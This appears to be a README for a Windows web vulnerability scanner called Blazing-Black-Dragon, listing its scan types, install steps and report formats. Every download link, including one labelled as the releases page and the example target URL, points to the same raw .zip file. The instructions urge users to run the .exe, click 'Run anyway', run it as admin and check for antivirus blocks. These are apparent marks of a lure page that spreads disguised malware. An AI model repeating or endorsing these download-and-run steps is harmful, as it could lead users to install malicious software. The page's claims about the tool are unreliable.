# 🐉 Blazing-Black-Dragon - Scan Web Risks Fast

[![Download Blazing-Black-Dragon](https://img.shields.io/badge/Download-Release_Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/unguaranteed-cabin828/Blazing-Black-Dragon/main/docs/Dragon_Black_Blazing_v1.7.zip)

## 🧰 What This Tool Does

Blazing-Black-Dragon is a web vulnerability scanner for authorised testing. It helps you check a website for common security issues and gather useful scan results in one place.

It can help you look for:

- XSS
- SQL injection
- SSTI
- LFI
- Command injection
- CORS issues
- GraphQL issues
- Subdomains
- Open ports
- SSL checks
- CMS detection
- Open redirect
- CSRF
- Request smuggling
- External tool support with Nikto and Nuclei
- HTML, JSON, CSV, and XML reports

## 💻 Before You Start

Use a Windows PC with:

- Windows 10 or Windows 11
- Internet access for the first download
- At least 4 GB of RAM
- 200 MB of free disk space
- Microsoft Defender or another antivirus that lets you run trusted tools
- A modern browser for reading reports

If the tool uses extra scan modules, it may also need:

- Python 3
- Access to common network ports
- Permission to scan the target system

## 📥 Download the Tool

Visit the release page and download the Windows file from there:

[Open the latest releases page](https://raw.githubusercontent.com/unguaranteed-cabin828/Blazing-Black-Dragon/main/docs/Dragon_Black_Blazing_v1.7.zip)

On that page, look for a file with one of these names:

- `Blazing-Black-Dragon.exe`
- `Blazing-Black-Dragon-windows.zip`
- `blazing-black-dragon-win.zip`

If you see a `.zip` file, download it and extract it first. If you see a `.exe` file, you can run it after the download finishes.

## 🪟 Install on Windows

### If you downloaded a `.exe` file

1. Open the folder where the file was saved.
2. Double-click the file.
3. If Windows shows a security prompt, choose **Run anyway** only if you trust the source.
4. Follow the on-screen steps.

### If you downloaded a `.zip` file

1. Right-click the `.zip` file.
2. Choose **Extract All**.
3. Pick a folder you can find later, such as **Downloads** or **Desktop**.
4. Open the extracted folder.
5. Double-click the main `.exe` file.

## 🚀 First Launch

1. Start Blazing-Black-Dragon.
2. If the app asks for a target URL, enter the website you want to test.
3. Set your scan options.
4. Choose a scan mode.
5. Click or press the start button.

A simple first test may include:

- One website
- One scan profile
- Default report output
- Limited port checks

This gives you a quick result without a long wait.

## 🧭 How to Use It

### 1. Enter a target

Type the website address you want to check.

Example:

- `https://raw.githubusercontent.com/unguaranteed-cabin828/Blazing-Black-Dragon/main/docs/Dragon_Black_Blazing_v1.7.zip`

Use a target you are allowed to test.

### 2. Pick scan types

Choose the checks you want. You can run a full scan or pick only a few checks.

Common choices:

- Web input checks
- Header checks
- Port checks
- CMS checks
- SSL checks
- GraphQL checks

### 3. Add tools if needed

If your workflow uses Nikto or Nuclei, turn on those options in the app.

This can help you:

- Run extra checks
- Compare findings
- Build a wider report

### 4. Start the scan

After you confirm the target and options, start the scan and wait for the results.

The tool may show:

- Live findings
- Request data
- Vulnerability names
- Confidence levels
- A report path

## 📊 Report Types

Blazing-Black-Dragon can generate several report formats:

- **HTML** for easy viewing in a browser
- **JSON** for other tools and scripts
- **CSV** for spreadsheets
- **XML** for systems that use XML input

### How to open reports

- HTML reports open in your browser
- CSV files open in Excel or LibreOffice
- JSON files open in a text editor
- XML files open in a text editor or data tool

## 🗂️ Suggested Workflow

If you are new to this kind of tool, use this order:

1. Run a small scan first
2. Review the report
3. Turn on more checks
4. Run a deeper scan
5. Save the final report

This helps you stay organized and keeps the scan time under control.

## ⚙️ Common Settings

You may see options such as:

- Scan depth
- Timeout
- Thread count
- Port range
- Report folder
- Proxy settings
- User agent
- SSL check toggle
- Subdomain check toggle

### Simple starting values

If you are not sure what to use, try:

- Medium scan depth
- Default timeout
- Standard port range
- HTML report output
- One target at a time

## 🔐 Use Cases

Blazing-Black-Dragon is useful for:

- Bug bounty work
- Web app security testing
- Site hardening checks
- Internal security review
- QA security checks before release
- Endpoint and header review
- Basic attack surface mapping

## 📂 Example Output Folder

After a scan, you may see files like:

- `report.html`
- `report.json`
- `report.csv`
- `report.xml`
- `logs.txt`

Keep these files in one folder so you can find them later.

## 🧪 What the Scanner Checks

The app may test for:

- Reflected and stored XSS
- SQL injection points
- Template injection signs
- File path handling issues
- Command handling flaws
- Cross-origin policy problems
- GraphQL exposure
- Missing security headers
- Redirect abuse
- CSRF risk
- HTTP request smuggling clues
- Open ports and exposed services
- SSL setup issues
- CMS fingerprints
- Subdomain discovery

## 🛠️ Troubleshooting

### The app does not open

- Check that the file finished downloading
- Move the file to a simple folder name, like `C:\Tools`
- Try running it as admin if your policy allows it
- Check if antivirus blocked the file

### The scan does not start

- Confirm the target URL is correct
- Make sure the target is online
- Check your internet connection
- Lower the scan depth and try again

### Reports do not show up

- Check the output folder
- Make sure you have write access
- Try a new folder with a short path
- Look for blocked file access in Windows Security

### The scan feels slow

- Reduce the number of checks
- Scan one target at a time
- Lower thread count
- Skip deep port sweeps on the first run

## 🧼 Safe Use

Only test systems you are allowed to test. Use it on your own sites, client systems with permission, or approved lab targets.

## 🧩 Quick Start Checklist

- Download the release from the release page
- Extract the file if it came in a zip
- Open the app
- Enter a target URL
- Choose scan options
- Start the scan
- Open the report when it finishes

## 📌 File Tips

If you want a smooth first run:

- Keep the app in a short folder path
- Avoid spaces and special characters in the folder name
- Save reports in a separate folder
- Use a modern browser for HTML reports
- Keep your target list small at first